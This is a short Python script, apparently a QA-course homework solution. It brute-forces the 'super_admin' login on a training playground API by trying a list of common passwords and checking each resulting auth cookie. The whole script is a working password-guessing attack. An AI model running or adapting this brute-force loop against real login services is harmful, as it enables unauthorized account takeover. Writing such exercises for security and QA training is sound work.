import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


login = "super_admin"
passwords = ["555555", "654321", "666666", "696969", "888888", "1234567", "7777777", "12345678", "123456789",
             "1234567890", "!@#$%^&*", "123qwe", "1q2w3e4r", "1qaz2wsx", "aa123456", "abc123", "access", "admin",
             "adobe123[a]", "ashley", "azerty", "bailey", "baseball", "batman", "charlie", "donald", "dragon",
             "flower", "Football", "football", "freedom", "hello", "hottie", "iloveyou", "jesus", "letmein", "login",
             "lovely", "loveme", "master", "michael", "monkey", "mustang", "ninja", "passw0rd", "password",
             "password1", "photoshop[a]", "princess", "qazwsx", "qwerty", "qwerty123", "qwertyuiop", "shadow",
             "solo", "starwars", "sunshine", "superman", "trustno1", "welcome", "whatever", "zaq1zaq1"
            ]

for password in passwords:
    response = requests.post(url, data={"login": login, "password": password})
    auth_cookie = response.cookies['auth_cookie']

    response = requests.get(url_check_auth_cookie, cookies={"auth_cookie": auth_cookie})
    if response.text != "You are NOT authorized":
        print(f"{response.status_code} - password = '{password}' {response.text}  -  auth_cookie={auth_cookie} ")

